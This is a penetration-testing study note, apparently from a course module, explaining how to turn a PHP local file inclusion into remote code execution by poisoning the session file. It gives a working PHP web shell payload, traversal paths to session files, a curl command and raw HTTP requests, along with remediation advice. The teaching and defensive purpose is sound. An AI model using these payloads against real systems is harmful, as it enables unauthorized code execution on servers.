---
tags: [vapt, lfi, rce, php, intermediate]
difficulty: intermediate
module: "23 - Path Traversal and LFI/RFI"
topic: "23.09 LFI to RCE via PHP Session File"
---

# 23.09 — LFI to RCE via PHP Session File

## What is it?
When a PHP application uses sessions to track users (e.g., keeping you logged in), it assigns you a unique Session ID (typically stored in a cookie named `PHPSESSID`). To store the data associated with your session (like your username, preferences, or cart contents), PHP writes a temporary file to the server's disk, usually in `/var/lib/php/sessions/`. The file is named `sess_<YOUR_SESSION_ID>`.

If an application takes user input and stores it inside a session variable without sanitization, an attacker can input malicious PHP code (e.g., setting their profile name to `<?php system('id'); ?>`). PHP will write that exact string into the session file on disk. 

If the application also suffers from a Local File Inclusion (LFI) vulnerability, the attacker can use the LFI to include their own session file. PHP parses the file, finds the injected tags, and executes the payload, granting Remote Code Execution (RCE).

Think of it like taking a test. You write a secret message on your exam paper (the session file). Later, you trick the teacher (the LFI vulnerability) into reading your specific exam paper aloud to the class.

## ASCII Diagram
```text
[Step 1: Poison the Session File]
[Attacker] ──> POST /profile.php
               Username: <?php system($_GET['cmd']); ?>
               Cookie: PHPSESSID=abc123xyz
       │
       ▼
[PHP Engine]
       │
       ├─ Opens: /var/lib/php/sessions/sess_abc123xyz
       ├─ Writes: username|s:31:"<?php system($_GET['cmd']); ?>";
       │
[Step 2: Trigger the LFI]
[Attacker] ──> GET /index.php?page=../../../../var/lib/php/sessions/sess_abc123xyz&cmd=id
               Cookie: PHPSESSID=abc123xyz
       │
       ▼
[Vulnerable PHP App]
       │
       ├─ include("/var/lib/php/sessions/sess_abc123xyz");
       ├─ PHP interpreter scans the text.
       ├─ Finds <?php system($_GET['cmd']); ?>
       ├─ Evaluates $_GET['cmd'] -> "id"
       │
[Execution] ──> Runs `id` command. Returns output to attacker!
```

## How to Find It
- **Manual steps:**
  1. Confirm an LFI vulnerability.
  2. Verify that the application uses PHP sessions (look for a `PHPSESSID` cookie).
  3. Attempt to read your own session file via the LFI payload: `?page=../../../../../../var/lib/php/sessions/sess_<YOUR_PHPSESSID>`. (e.g., if your cookie is `PHPSESSID=1234`, request `sess_1234`).
  4. If the server returns text containing your serialized session data (e.g., `user_id|i:42;`), you can read session files.
  5. Explore the application to find a feature that takes your input and reflects it across pages (e.g., updating a profile name, adding an item to a cart, or even just searching if the search term is saved to your session history).

- **Tool commands with flags explained:**
  Using `curl` to read the session file:
  ```bash
  # Send the session cookie and attempt to include the corresponding file
  curl -s -b "PHPSESSID=attacker123" "https://target.com/index.php?page=../../../../../../var/lib/php/sessions/sess_attacker123"
  ```

## How to Exploit It
- **Step-by-step walkthrough:**
  1. Find a feature that saves your input to the PHP session.
  2. Input a PHP payload: `<?php system($_GET['c']); ?>`.
  3. Verify the payload was saved by triggering the LFI to read your session file: `?page=../../../../var/lib/php/sessions/sess_<ID>`.
  4. Notice that your payload might be serialized inside a string (e.g., `s:31:"<?php ... ?>"`). The `include()` function does not care about the serialization formatting; it just looks for `<?php` and executes it.
  5. Add the command parameter to the URL (e.g., `&c=whoami`) and send the request.

- **Actual payloads:**
  **Common Session File Locations:**
  ```text
  /var/lib/php/sessions/sess_<ID>
  /var/lib/php5/sessions/sess_<ID>
  /tmp/sess_<ID>
  /tmp/sessions/sess_<ID>
  ```
  *(Note: You must prepend `sess_` to the value of your `PHPSESSID` cookie).*

- **Real HTTP request/response examples:**
  **Poisoning the Session:**
  ```http
  POST /update_profile HTTP/1.1
  Host: target.com
  Cookie: PHPSESSID=9a8b7c6d5e4f
  
  first_name=<?php system($_GET['cmd']); ?>
  ```
  **Triggering Execution:**
  ```http
  GET /index.php?page=../../../../../../var/lib/php/sessions/sess_9a8b7c6d5e4f&cmd=id HTTP/1.1
  Host: target.com
  Cookie: PHPSESSID=9a8b7c6d5e4f
  ```
  **Execution Response:**
  ```http
  HTTP/1.1 200 OK
  
  first_name|s:31:"uid=33(www-data) gid=33(www-data)";
  ```

## Real-World Example
In a known capture-the-flag scenario that mirrors real-world e-commerce platforms, an attacker found an LFI in the language selector (`?lang=../../`). The server blocked access to `/var/log/apache2` and `/proc/self/environ`. However, the site had a "Recently Viewed Items" feature that stored the ID of viewed items in the user's session. The attacker viewed an item, intercepted the request, and changed the item ID from `42` to `<?php system('ls'); ?>`. They then included their session file from `/var/lib/php/sessions/sess_<cookie>` and instantly received a directory listing of the web root.

## How to Fix It
- **Developer remediation:**
  Fix the underlying LFI vulnerability by using an explicit allowlist for file inclusions. 
  
  From a systems administration perspective, ensure that session files are stored securely. However, because PHP *must* be able to read and write its own session files, file permissions cannot prevent this attack natively (unlike log files, which can be owned by `root`). The absolute defense is fixing the LFI. Alternatively, configure PHP to store sessions in a database or Redis cluster instead of the local filesystem (by changing `session.save_handler` in `php.ini`).

- **Code snippet:**
  **php.ini (Using Redis for Sessions to prevent file inclusion):**
  ```ini
  ; Stop storing sessions as text files on disk
  session.save_handler = redis
  session.save_path = "tcp://127.0.0.1:6379"
  ```

## Chaining Opportunities
- This vuln + [[Missing File Permissions / Sudo Privileges]] → Because session files are inherently owned by `www-data`, once RCE is achieved, pivot immediately to enumerating the local system for privilege escalation vectors.
- This vuln + [[07 - XSS / Cross-Site Scripting]] → If the profile name field strictly strips `<script>` tags but allows `<?php` tags, it might not be vulnerable to XSS, but it is highly vulnerable to this LFI-to-RCE chain.

## Related Notes
- [[05 - Local File Inclusion (LFI)]]
- [[07 - LFI to RCE via Log Poisoning]]
- [[08 - LFI to RCE via _proc_self_environ]]
